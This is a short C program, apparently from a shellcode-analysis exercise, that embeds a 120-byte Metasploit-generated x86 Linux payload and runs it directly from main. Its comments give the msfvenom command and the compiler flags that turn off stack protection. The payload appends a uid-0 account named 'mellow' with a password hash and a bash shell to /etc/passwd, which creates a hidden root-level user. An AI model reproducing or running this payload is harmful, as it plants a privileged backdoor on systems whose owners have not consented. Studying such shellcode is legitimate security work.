#include <stdio.h>
#include <stdlib.h>

char shellcode[] = \
"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd\x80"
"\x31\xc9\x31\xdb\xf7\xe3\xb0\xaa\xcd\x80\x31\xc9\x89\xcb\x6a"
"\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64"
"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04"
"\xcd\x80\x93\xe8\x26\x00\x00\x00\x6d\x65\x6c\x6c\x6f\x77\x3a"
"\x41\x7a\x61\x4a\x38\x59\x76\x63\x6e\x71\x31\x47\x59\x3a\x30"
"\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
"\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80";
// msfvenom -p linux/x86/adduser USER=mellow PASS=novian SHELL=/bin/bash PrependFork=true PrependSetresgid=true Prependresuid=true VERBOSE=true -a x86 --platform linux -f c
// 120 bytes 
// gcc 0x5_0x1_adduser.c -o 0x5_0x1_adduser.elf -fno-stack-protector -z execstack

int main(int argc, char **argv[]){
	(* (int (*)())shellcode)();
}

